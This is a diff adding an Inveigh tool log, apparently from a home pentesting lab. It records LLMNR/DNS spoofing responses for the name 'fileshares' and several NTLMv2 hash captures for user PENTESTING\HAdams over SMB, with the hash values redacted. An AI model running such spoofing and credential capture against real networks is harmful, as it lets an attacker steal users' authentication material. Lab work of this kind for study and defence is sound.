@@ -1,0 +1,93 @@
+[*] Inveigh 0.913 started at 2021-03-29T18:19:17
+[+] Elevated Privilege Mode = Enabled
+[+] Primary IP Address = 192.168.1.55
+[+] Primary IPv6 Address = fe80::e065:2068:a228:cb0d%8
+[+] Spoofer IP Address = 192.168.1.55
+[+] Spoofer IPv6 Address = fe80::e065:2068:a228:cb0d%8
+[+] Spoofer MAC Address = 00:0C:29:9B:FA:70
+[+] Packet Sniffer = Enabled
+[+] DHCPv6 Spoofer = Disabled
+[+] DNS Spoofer For Types A = Enabled
+[+] DNS TTL = 30
+[+] LLMNR Spoofer = Enabled
+[+] LLMNRv6 Spoofer = Disabled
+[+] LLMNR TTL = 30
+[+] mDNS Spoofer = Disabled
+[+] NBNS Spoofer = Disabled
+[+] HTTP Capture = Enabled
+[+] HTTP Authentication = NTLM
+[+] Proxy Capture = Disabled
+[+] WPAD Authentication = NTLM
+[+] WPAD NTLM Authentication Ignore List = Firefox
+[+] SMB Capture = Enabled
+[+] Machine Account Capture = Disabled
+[+] File Output = Enabled
+[+] Log Output = Enabled
+[+] Pcap Output = Disabled
+[+] Previous Session Files = Not Found
+[+] Output Directory = C:\AD\InveighZero-master\Inveigh\bin\x64\Debug
+[*] Press ESC to access console
+[+] [2021-03-29T18:19:17] mDNS(QM) request for master._omsg._tcp.local from 192.168.1.137 [spoofer disabled]
+[+] [2021-03-29T18:19:25] NBNS request for PENTESTING<1B> from 192.168.1.55 [spoofer disabled]
+[+] [2021-03-29T18:19:25] NBNS request for PENTESTING<1B> from 192.168.1.55 [spoofer disabled]
+[+] [2021-03-29T18:19:28] NBNS request for PENTESTING<1E> from 192.168.1.55 [spoofer disabled]
+[+] [2021-03-29T18:19:28] NBNS request for PENTESTING<1E> from 192.168.1.55 [spoofer disabled]
+[+] [2021-03-29T18:19:28] NBNS request for PENTESTING<1E> from 192.168.1.55 [spoofer disabled]
+[+] [2021-03-29T18:19:28] NBNS request for PENTESTING<1E> from 192.168.1.55 [spoofer disabled]
+[+] [2021-03-29T18:19:29] NBNS request for PENTESTING<1E> from 192.168.1.55 [spoofer disabled]
+[+] [2021-03-29T18:19:29] NBNS request for PENTESTING<1E> from 192.168.1.55 [spoofer disabled]
+[+] [2021-03-29T18:19:31] DNS(A) request for fileshares.pentesting.local sent to 192.168.1.50 [outgoing query]
+[+] [2021-03-29T18:19:31] DNS(A) request for fileshares.hsd1.md.comcast.net sent to 192.168.1.50 [outgoing query]
+[+] [2021-03-29T18:19:32] DNS(A) request for fileshares.hsd1.md.comcast.net sent to 192.168.1.50 [outgoing query]
+[+] [2021-03-29T18:19:34] DNS(A) request for fileshares.hsd1.md.comcast.net sent to 192.168.1.50 [outgoing query]
+[+] [2021-03-29T18:19:38] NBNS request for FILESHARES<20> from 192.168.1.55 [spoofer disabled]
+[+] [2021-03-29T18:19:38] NBNS request for FILESHARES<20> from 192.168.1.55 [spoofer disabled]
+[+] [2021-03-29T18:19:38] LLMNR request for fileshares from 192.168.1.55 [response sent]
+[+] [2021-03-29T18:19:38] LLMNR request for fileshares from 192.168.1.55 [response sent]
+[+] [2021-03-29T18:19:39] NBNS request for FILESHARES<20> from 192.168.1.55 [spoofer disabled]
+[+] [2021-03-29T18:19:39] NBNS request for FILESHARES<20> from 192.168.1.55 [spoofer disabled]
+[+] [2021-03-29T18:19:39] TCP(445) SYN packet from 192.168.1.55:49947
+[+] [2021-03-29T18:19:39] SMB(49947) outgoing negotiation request detected to 192.168.1.55:445
+[+] [2021-03-29T18:19:39] SMB(445) NTLM challenge 465DF6F957F1F3ED sent to 192.168.1.55:49947
+[+] [2021-03-29T18:19:39] SMB(445) NTLMv2 captured for PENTESTING\HAdams from 192.168.1.55(STUDENT):49947:
+[redacted]
+[!] [2021-03-29T18:19:39] SMB(445) NTLMv2 written to Inveigh-NTLMv2.txt
+[+] [2021-03-29T18:19:39] DNS(A) request for fileshares.pentesting.local sent to 192.168.1.50 [outgoing query]
+[+] [2021-03-29T18:19:39] DNS(A) request for fileshares.hsd1.md.comcast.net sent to 192.168.1.50 [outgoing query]
+[+] [2021-03-29T18:19:39] NBNS request for FILESHARES<20> from 192.168.1.55 [spoofer disabled]
+[+] [2021-03-29T18:19:39] NBNS request for FILESHARES<20> from 192.168.1.55 [spoofer disabled]
+[+] [2021-03-29T18:19:40] DNS(A) request for fileshares.hsd1.md.comcast.net sent to 192.168.1.50 [outgoing query]
+[+] [2021-03-29T18:19:42] DNS(A) request for fileshares.hsd1.md.comcast.net sent to 192.168.1.50 [outgoing query]
+[+] [2021-03-29T18:19:42] mDNS(QM) request for _googlecast._tcp.local from 192.168.1.110 [spoofer disabled]
+[+] [2021-03-29T18:19:42] mDNS(QM) request for google-home-mini-58fee51c20651e957e41b1871d0414e9._googlecast._tcp.local from 192.168.1.110 [spoofer disabled]
+[+] [2021-03-29T18:19:43] mDNS(QM) request for _googlecast._tcp.local from 192.168.1.110 [spoofer disabled]
+[+] [2021-03-29T18:19:43] mDNS(QM) request for philips-4k-tv-7fc05c3db347b4c1c668314e358505b1._googlecast._tcp.local from 192.168.1.110 [spoofer disabled]
+[+] [2021-03-29T18:19:43] mDNS(QM) request for _googlecast._tcp.local from 192.168.1.219 [spoofer disabled]
+[+] [2021-03-29T18:19:43] mDNS(QM) request for google-home-mini-58fee51c20651e957e41b1871d0414e9._googlecast._tcp.local from 192.168.1.219 [spoofer disabled]
+[+] [2021-03-29T18:19:43] NBNS request for FILESHARES<20> from 192.168.1.55 [spoofer disabled]
+[+] [2021-03-29T18:19:43] NBNS request for FILESHARES<20> from 192.168.1.55 [spoofer disabled]
+[+] [2021-03-29T18:19:43] LLMNR request for fileshares from 192.168.1.55 [response sent]
+[+] [2021-03-29T18:19:43] LLMNR request for fileshares from 192.168.1.55 [response sent]
+[+] [2021-03-29T18:19:44] TCP(445) SYN packet from 192.168.1.55:49949
+[+] [2021-03-29T18:19:44] SMB(49949) outgoing negotiation request detected to 192.168.1.55:445
+[+] [2021-03-29T18:19:44] SMB(445) NTLM challenge 85A910D3C63720E7 sent to 192.168.1.55:49949
+[+] [2021-03-29T18:19:44] SMB(445) NTLMv2 captured for PENTESTING\HAdams from 192.168.1.55(STUDENT):49949:
+[redacted]
+[+] [2021-03-29T18:19:44] DNS(A) request for fileshares.pentesting.local sent to 192.168.1.50 [outgoing query]
+[+] [2021-03-29T18:19:44] DNS(A) request for fileshares.hsd1.md.comcast.net sent to 192.168.1.50 [outgoing query]
+[+] [2021-03-29T18:19:44] NBNS request for FILESHARES<20> from 192.168.1.55 [spoofer disabled]
+[+] [2021-03-29T18:19:44] NBNS request for FILESHARES<20> from 192.168.1.55 [spoofer disabled]
+[+] [2021-03-29T18:19:45] DNS(A) request for fileshares.hsd1.md.comcast.net sent to 192.168.1.50 [outgoing query]
+[+] [2021-03-29T18:19:45] NBNS request for FILESHARES<20> from 192.168.1.55 [spoofer disabled]
+[+] [2021-03-29T18:19:45] NBNS request for FILESHARES<20> from 192.168.1.55 [spoofer disabled]
+[+] [2021-03-29T18:19:47] DNS(A) request for fileshares.hsd1.md.comcast.net sent to 192.168.1.50 [outgoing query]
+[+] [2021-03-29T18:19:51] NBNS request for FILESHARES<20> from 192.168.1.55 [spoofer disabled]
+[+] [2021-03-29T18:19:51] NBNS request for FILESHARES<20> from 192.168.1.55 [spoofer disabled]
+[+] [2021-03-29T18:19:51] LLMNR request for fileshares from 192.168.1.55 [response sent]
+[+] [2021-03-29T18:19:51] LLMNR request for fileshares from 192.168.1.55 [response sent]
+[+] [2021-03-29T18:19:51] NBNS request for FILESHARES<20> from 192.168.1.55 [spoofer disabled]
+[+] [2021-03-29T18:19:51] NBNS request for FILESHARES<20> from 192.168.1.55 [spoofer disabled]
+[+] [2021-03-29T18:19:52] TCP(445) SYN packet from 192.168.1.55:49950
+[+] [2021-03-29T18:19:52] SMB(49950) outgoing negotiation request detected to 192.168.1.55:445
+[+] [2021-03-29T18:19:52] SMB(445) NTLM challenge 5D4B8CAE514CFA5D sent to 192.168.1.55:49950
+[+] [2021-03-29T18:19:52] SMB(445) NTLMv2 captured for PENTESTING\HAdams from 192.168.1.55(STUDENT):49950:
